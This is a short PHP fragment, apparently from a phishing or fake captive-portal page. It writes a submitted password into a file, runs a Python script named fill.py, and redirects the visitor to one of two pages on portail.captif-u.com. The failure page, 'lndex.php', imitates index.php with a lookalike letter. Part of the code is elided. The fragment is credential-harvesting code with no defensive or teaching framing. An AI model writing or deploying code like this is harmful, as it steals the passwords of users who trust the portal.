<?php
	...
	fwrite($fileopen, $_POST['password']);
	fclose($fileopen);
	$status= exec('python3 fill.py');
	if ($status == "OK")
	{
		echo "<meta http-equiv='refresh' content='0; url=http://portail.captif-u.com/sensib.php' />";
	} else {
		echo "<meta http-equiv='refresh' content='0; url=http://portail.captif-u.com/lndex.php' />";
	}
